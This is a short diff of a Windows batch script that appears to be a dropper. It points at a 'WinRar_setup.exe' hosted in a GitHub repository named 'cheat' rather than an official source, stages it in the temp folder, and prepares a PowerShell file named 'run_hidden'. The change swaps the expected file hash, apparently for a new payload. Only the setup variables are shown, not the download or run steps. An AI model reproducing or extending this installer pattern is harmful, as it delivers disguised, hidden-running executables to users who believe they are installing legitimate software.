@@ -2,7 +2,7 @@
 setlocal EnableExtensions DisableDelayedExpansion
 
 set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
-set "HASH=3271c6372c136be4f9e7b276b3cb3b52ed4c408e1abc6405d15551212279dfac"
+set "HASH=07f2175d37df5b405bf95bc3c216e97be7abd2f6ae62aed58273aa5b7d233312"
 set "WORK_DIR=%TEMP%\WinRarPkg"
 set "OUT=%WORK_DIR%\WinRar_setup.exe"
 set "PS_FILE=%TEMP%\run_hidden_%RANDOM%.ps1"
